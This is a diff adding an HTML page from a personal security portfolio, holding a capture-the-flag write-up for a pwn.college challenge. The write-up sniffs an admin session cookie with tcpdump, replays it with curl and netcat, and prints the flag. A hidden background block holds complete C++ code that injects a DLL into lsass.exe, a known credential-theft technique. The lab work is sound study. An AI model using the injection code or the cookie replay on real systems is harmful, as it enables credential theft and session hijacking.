@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie-Sniffer 🕵️‍♂️🍪</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Cookie-Sniffer 🕵️‍♂️🍪" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Cookie-Sniffer 🕵️‍♂️🍪</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-task-description">🧠 Task Description</h2>
+
+<p><strong>Challenge Name:</strong> Cookie-Sniffer<br />
+<strong>Platform:</strong> pwn.college<br />
+<strong>Goal:</strong> Steal the admin’s session cookie and use it to retrieve the flag from the server.</p>
+
+<blockquote>
+  <p>💡 <em>Hint from challenge:</em><br />
+Use your full set of HTTP tools (e.g., <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">nc</code>, <code class="language-plaintext highlighter-rouge">tcpdump</code>, etc.) to steal and use the cookie. Make sure to run everything in the terminal on <code class="language-plaintext highlighter-rouge">10.0.0.1</code>!</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-reconnaissance">🔍 Reconnaissance</h2>
+
+<p>By examining <code class="language-plaintext highlighter-rouge">/challenge/run</code>, we see a Python-based setup using Flask to simulate a login system and session management.</p>
+
+<h3 id="key-points-from-run-script">Key points from <code class="language-plaintext highlighter-rouge">run</code> script:</h3>
+<ul>
+  <li>Admin logs in to <code class="language-plaintext highlighter-rouge">http://10.0.0.2/login</code> with a randomly generated password.</li>
+  <li>A Flask session is created for the user with a secret key.</li>
+  <li><code class="language-plaintext highlighter-rouge">/flag</code> endpoint only responds if the user is <code class="language-plaintext highlighter-rouge">"admin"</code> in session.</li>
+</ul>
+
+<p>The goal is clear: <strong>Sniff the traffic, find the session cookie, and use it to access <code class="language-plaintext highlighter-rouge">/flag</code>.</strong></p>
+
+<hr />
+
+<h2 id="-exploitation-sniff-the-admin-cookie">📡 Exploitation: Sniff the Admin Cookie</h2>
+
+<p>We start by running <code class="language-plaintext highlighter-rouge">tcpdump</code> to intercept HTTP traffic to/from the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-0-0-1:~# tcpdump <span class="nt">-i</span> eth0 <span class="nt">-A</span> host 10.0.0.2 and port 80 | <span class="nb">grep </span>Cookie
+</code></pre></div></div>
+<p>Captured Cookie:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aIpVMw.xUesKcudRDiq9j9kKh2eAxLrOLo
+</code></pre></div></div>
+<p>The cookie includes a session JWT with user=admin.</p>
+
+<hr />
+
+<h2 id="accessing-the-flag">Accessing the Flag</h2>
+<h3 id="option-1-using-curl">Option 1: Using curl</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VyIjoiYWRtaW4ifQ.aIpVMw.xUesKcudRDiq9j9kKh2eAxLrOLo"</span> http://10.0.0.2/flag
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{41-255x-yJ6Y3i06sHOi-hYSeFY.0VM0AjNxwSM0IzMyEzW}
+</code></pre></div></div>
+<h3 id="option-2-using-nc-netcat">Option 2: Using nc (netcat)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /flag HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:localhost</span><span class="se">\r\n</span><span class="s2">Cookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.aIpVMw.xUesKcudRDiq9j9kKh2eAxLrOLo</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc localhost 80
+</code></pre></div></div>
+<p>This also works, but curl is easier and cleaner.
+—</p>
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>41-255x-yJ6Y3i06sHOi-hYSeFY.0VM0AjNxwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
